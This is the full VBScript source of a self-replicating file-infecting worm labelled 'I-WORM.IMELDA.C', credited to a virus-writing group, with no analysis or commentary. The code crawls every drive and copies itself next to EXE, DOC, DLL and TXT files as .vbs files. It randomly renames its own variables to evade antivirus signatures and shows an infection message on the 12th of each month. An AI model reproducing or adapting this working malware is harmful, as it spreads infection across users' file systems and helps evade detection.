'I-WORM.IMELDA.C
'Poly & Crypt - (C)2001, by Iwing
'Virusindo - Indonesian Virus Network
'http://indovirus.8m.com , IRC Dalnet #indovirus
'===============================================
Call REKIPV
Set MGDBIC = CreateObject("scripting.filesystemobject")
Call ALFGNO
if day(now) = 12 then
BFLRND = msgbox("Hi there.., you are infected by some of" & Chr(13) & _
"IWING creations.., Poly & crypt By. Iwing - have a nice day", 10 ,"I-WORM.IMELDA.C ")
end if
Function ALFGNO()
On Error Resume Next
Set JITGKA = MGDBIC.Drives
For Each RDJGGH In  JITGKA
EVGFTR = RDJGGH & "\"
Call ILOVJU(EVGFTR)
Next
End Function
Function ILOVJU(VGGSIG)
FIKMFN = VGGSIG
Set CIKKTD = MGDBIC.GetFolder(FIKMFN)
Set ECECIG =  CIKKTD.Files
For Each  VENVAA In ECECIG
If MGDBIC.GetExtensionName(VENVAA.Path) = "EXE" Then
MGDBIC.CopyFile wscript.scriptfullname, VENVAA.Path & ".vbs", True
End If
If MGDBIC.GetExtensionName(VENVAA.Path) = "DOC" Then
MGDBIC.CopyFile wscript.scriptfullname, VENVAA.Path & ".vbs", True
End If
If MGDBIC.GetExtensionName(VENVAA.Path) = "DLL" Then
MGDBIC.CopyFile wscript.scriptfullname, VENVAA.Path & ".vbs", True
End If
If MGDBIC.GetExtensionName(VENVAA.Path) = "TXT" Then
MGDBIC.CopyFile wscript.scriptfullname, VENVAA.Path & ".vbs", True
End If
Next
Set RENJAO = CIKKTD.Subfolders
For Each  FTBNJH In RENJAO
Call ILOVJU(FTBNJH.Path)
Next
End Function
function REKIPV
Randomize
Set CVPRGL = CreateObject("scripting.filesystemobject")
Set QSEVCQL = CVPRGL.OpenTextFile(WScript.ScriptFullName, 1)
HBMHAD = QSEVCQL.Readall
ECCVQK = "MGDBIC ALFGNO BFLRND JITGKA RDJGGH EVGFTR ILOVJU FIKMFN VGGSIG VENVAA ECECIG RENJAO FTBNJH REKIPV CVPRGL QSEVCQ HBMHAD ECCVQK TTIAKC GRTMTI QSEVCQL CIKKTD "
Do
TTIAKC = Left(ECCVQK, InStr(ECCVQK, Chr(32)) - 1)
ECCVQK = Mid(ECCVQK, InStr(ECCVQK, Chr(32)) + 1)
VNOFVA = Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65))
Do
GRTMTI = InStr(GRTMTI + 1, HBMHAD, TTIAKC)
If GRTMTI Then HBMHAD = Mid(HBMHAD, 1, (GRTMTI - 1)) & VNOFVA & Mid(HBMHAD, (GRTMTI + Len(TTIAKC)))
Loop While GRTMTI
Loop While ECCVQK <> ""
Set QSEVCQL = CVPRGL.OpenTextFile(WScript.ScriptFullName, 2, True)
QSEVCQL.Writeline HBMHAD
end function
